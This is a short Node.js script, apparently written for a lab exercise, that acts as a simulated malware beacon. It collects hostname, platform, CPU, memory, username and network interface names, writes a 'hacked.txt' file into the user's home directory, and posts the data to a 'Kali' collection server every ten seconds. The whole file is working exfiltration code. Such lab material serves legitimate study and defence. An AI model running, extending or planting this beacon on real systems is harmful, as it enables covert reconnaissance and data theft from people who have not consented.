const fs = require("fs");
const os = require("os");
const axios = require("axios");
const path = require("path");

// Kali Linux server (http://192.168.74.2:3000)
const KALI_SERVER = "http://192.168.74.2:3000/collect";

// 1. Collect system data
function gatherSystemInfo() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    cpu: os.cpus()[0].model,
    memory: `${(os.totalmem() / 1024 ** 3).toFixed(2)} GB`,
    user: os.userInfo().username,
    network: Object.keys(os.networkInterfaces()),
  };
}

// 2. Drop a test file (simulating malware payload)
function dropFile() {
  const filePath = path.join(os.homedir(), "hacked.txt");
  fs.writeFileSync(filePath, "You have been simulatedly hacked!\n");
  return filePath;
}

// 3. Send data to Kali
async function exfiltrateData() {
  try {
    const systemData = gatherSystemInfo();
    const droppedFile = dropFile();

    console.log("[*] Dropping file:", droppedFile);
    console.log("[*] Sending data to Kali...");

    await axios.post(KALI_SERVER, {
      ...systemData,
      droppedFile,
      timestamp: new Date().toISOString(),
    });

    console.log("[+] Data exfiltration successful!");
  } catch (err) {
    console.error("[-] Error:", err.message);
  }
}

// Run every 10 seconds
setInterval(exfiltrateData, 10000);
